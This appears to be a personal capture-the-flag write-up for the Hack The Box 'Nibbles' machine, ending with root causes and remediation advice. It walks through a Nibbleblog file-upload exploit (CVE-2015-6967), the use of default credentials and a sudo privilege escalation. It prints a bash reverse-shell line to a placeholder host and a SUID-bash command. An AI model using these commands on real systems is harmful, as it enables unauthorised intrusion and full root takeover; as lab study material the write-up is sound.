# Nibbles — HTB Easy Linux

**Chain:** web enum → Nibbleblog CMS 4.0.3 → CVE-2015-6967 (authenticated file-upload RCE) → world-writable root sudo script → root

**Date:** 2026-07-17 · Easy · **user + root owned**

---

## Recon

```
nmap -p- --min-rate 5000 <IP>
nmap -p22,80 -sCV <IP>
```

22 (SSH), 80 (HTTP). Opened port 80 in the browser — near-empty page, but the **HTML source** had a comment pointing to a directory (`/nibbleblog/`). Reading source is free recon; the comment is the lead.

Content discovery with feroxbuster on `/nibbleblog/`:

```
feroxbuster -u http://<IP>/nibbleblog/
```

Surfaced the CMS structure — notably:
- `users.xml` (under `/content/private/`) → leaked the admin **username: admin**
- `/admin.php` → the login page

## Foothold — CVE-2015-6967 (Nibbleblog 4.0.3)

Identified **Nibbleblog v4.0.3** (from the CMS files / version info). Known vuln: **CVE-2015-6967**, an authenticated arbitrary file upload in the "My image" plugin → RCE.

Logged into `/admin.php` by guessing weak creds:
- user `admin`, password `nibbles` *(verify exact password on re-solve — common pair for this box; some instances use a different weak password)*

Exploited the CVE — the My-Image plugin doesn't validate file type, so uploaded a PHP payload and triggered it via its predictable upload path:

```
# payload uploaded through Plugins > My image
# lands at /nibbleblog/content/private/plugins/my_image/image.php
curl "http://<IP>/nibbleblog/content/private/plugins/my_image/image.php"   # triggers exec
```

Used it to catch a reverse shell → landed as user **nibbler**.

```
cat /home/nibbler/user.txt
```

## Root — world-writable sudo script

Standard privesc check:

```
sudo -l
# (nibbler) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

`nibbler` can run `monitor.sh` as **root** with no password — and the script is **owned/writable by nibbler**. So overwrite it with a payload and run it as root:

```
echo 'chmod +s /bin/bash' >> /home/nibbler/personal/stuff/monitor.sh
# or: echo 'bash -i >& /dev/tcp/<TUN0>/4444 0>&1' >> monitor.sh
sudo /home/nibbler/personal/stuff/monitor.sh
```

Then:
```
/bin/bash -p    # if SUID route
id              # euid=0(root)
cat /root/root.txt
```

## Notes for the report
- Foothold came from reading HTML source + feroxbuster, not the visible page. Enumerate what's *not* shown.
- `users.xml` handed over the username — half the login solved before touching the panel.
- Root cause chain: weak/default admin creds → unvalidated file upload (CVE) → misconfigured sudo on a user-writable script. Three independent failures, any one of which breaks the chain if fixed.

## Root causes (interview-ready)
1. **Weak/default admin credentials** → panel access. → enforce strong creds, no defaults.
2. **CVE-2015-6967** — file-upload plugin doesn't validate type/content → RCE. → input/file validation, patch CMS.
3. **sudo NOPASSWD on a user-writable script** → trivial root. → never grant sudo on files the invoking user can edit; least privilege.

## Remediation
- Patch/replace Nibbleblog (4.0.3 is EOL and vulnerable).
- Remove default creds; rate-limit / lock the admin panel.
- Fix the sudo rule — root-owned, non-writable script only, or drop the rule entirely.
- Audit SUID + sudo config (`sudo -l`, `find / -perm -4000`).
- Maps to OWASP A05 (Misconfig) / A07 (Auth failures) / insecure file upload.

## Tools
`nmap` · `feroxbuster` · browser + source review · CVE-2015-6967 exploit · `nc` · `sudo -l` · `chmod +s`

---
*Note to self: verify the exact admin password and the monitor.sh path on re-solve, and swap `<IP>`/`<TUN0>` placeholders for real values (then redact before publishing).*
